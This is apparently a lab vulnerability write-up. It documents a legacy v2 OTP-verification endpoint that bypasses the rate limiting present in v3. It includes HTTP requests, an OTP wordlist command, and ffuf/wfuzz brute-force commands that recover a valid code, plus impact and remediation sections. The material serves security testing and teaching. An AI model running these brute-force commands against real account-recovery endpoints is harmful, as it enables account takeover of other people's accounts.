

# Improper Asset Management – Legacy API Version Exposure

## Vulnerability Metadata

| Field | Value |
|---------|---------|
| Vulnerability Type | Improper Asset Management |
| OWASP Category | API9:2023 – Improper Inventory Management |
| CWE | CWE-1059: Incomplete Documentation of Program Execution |
| CVSS v3.1 | 7.5 (High) |
| Vulnerable Endpoint | `/identity/api/auth/v2/check-otp` |
| Secure Endpoint | `/identity/api/auth/v3/check-otp` |
| HTTP Method | POST |

---

![[Attachments/Pasted image 20260530161332.png]]



## Description

This finding covers the identification, exploitation, and mitigation of an **Improper Asset Management** vulnerability within the Identity Service. During assessment, it was discovered that a legacy API version (`v2`) remained publicly accessible alongside the current production version (`v3`).

While the latest API version implements security controls designed to prevent OTP brute-force attacks, the deprecated version lacks equivalent protections and remains fully operational. As a result, attackers can bypass modern security mechanisms by interacting directly with the older endpoint.

This issue falls under **OWASP API9:2023 – Improper Inventory Management**, where outdated or undocumented API versions increase the attack surface and expose functionality that should no longer be accessible.

---
Clicking forgot-password to send OTP

![[Attachments/Pasted image 20260530161332.png]]


## Proof of Concept

### Step 1 – Verify API Version Exposure

Testing an invalid API version confirms that versioned endpoints are being used.

```http
POST /identity/api/auth/v1/check-otp HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/json

{
  "email": "hacker@gmail.com",
  "otp": "1234",
  "password": "Qwerty4$"
}
```

**Response**

```http
HTTP/1.1 404 Not Found

{
  "type": "about:blank",
  "title": "Not Found",
  "status": 404,
  "detail": "No static resource identity/api/auth/v1/check-otp."
}
```


![[Attachments/Pasted image 20260530161418.png]]


---

### Step 2 – Identify Legacy Endpoint

The legacy endpoint remains active and accepts OTP validation requests.

```http
POST /identity/api/auth/v2/check-otp HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/json

{
  "email": "hacker@gmail.com",
  "otp": "1234",
  "password": "Qwerty4$"
}
```

**Response**

```http
HTTP/1.1 500 Internal Server Error

{
  "message": "Invalid OTP! Please try again..",
  "status": 500
}
```

The response confirms that the endpoint is still operational and processing OTP validation requests.


![[Attachments/Pasted image 20260530161446.png]]

---

### Step 3 – Generate OTP Wordlist

Create a wordlist containing all possible four-digit OTP combinations.

```bash
seq 0000 9999 > /home/kali/hunter/ids.txt
```

---

### Step 4 – Execute Version-Downgrade Brute Force Attack

Using `ffuf`, automated requests are directed against the exposed legacy endpoint.
![[Attachments/Pasted image 20260530163859.png]]

```bash

1 .ffuf -d '{"email":"hacker@gmail.com","otp":"FUZZ","password":"Qwerty4$"}' \
-H "Content-Type: application/json" \
-X POST \
-u http://127.0.0.1:8888/identity/api/auth/v2/check-otp \
-w /home/kali/hunter/ids.txt \ 
-mc 200

2. wfuzz \
  -z file,/home/kali/hunter/ids.txt \
  -u http://127.0.0.1:8888/identity/api/auth/v2/check-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"user1@gmail.com","otp":"FUZZ","password":"Qwerty1$"}' \
  --sc 200
  
```

Because the legacy API lacks effective brute-force protection and rate limiting, OTP values can be enumerated until a valid code is discovered.

---

### Step 5 – Successful OTP Discovery

The brute-force process identifies a valid OTP.

```text
6705    [Status: 200, Size: 39, Words: 2, Lines: 1, Duration: 3589ms]
```

**Discovered OTP**

```text
6705
```

**Response**

```http
HTTP/1.1 200 OK
```

The successful response confirms that OTP verification can be bypassed through the exposed legacy API version.

---

## Impact

- Account Takeover (ATO) through unauthorized password reset operations.
- Circumvention of security controls implemented in newer API versions.
- Exposure of forgotten or undocumented functionality.
- Failure of OTP brute-force protections.
- Unauthorized credential modification.
- Increased risk of privilege escalation.
- Expanded attack surface due to unmanaged API inventory.
- Compliance and governance violations resulting from poor API lifecycle management.

---

## Remediation

### Retire Deprecated APIs

Remove all unused or deprecated API versions from production environments.

### Implement API Lifecycle Management

Establish a formal process for API versioning, deprecation, and retirement.

### Enforce Consistent Security Controls

Ensure that all supported API versions implement the same protections:

- Rate limiting
- OTP expiration
- Account lockout mechanisms
- MFA enforcement
- Security monitoring and alerting

### Maintain an API Inventory

Maintain a centralized inventory of:

- Public APIs
- Internal APIs
- Deprecated APIs
- Third-party integrations

### Continuous Security Assessments

Regularly audit exposed endpoints to identify forgotten, undocumented, or legacy services.

---

## References

- OWASP API Security Top 10 – API9:2023 Improper Inventory Management
- CWE-1059: Incomplete Documentation of Program Execution
- OWASP Application Security Verification Standard (ASVS)
- NIST SP 800-204A – Building Secure APIs




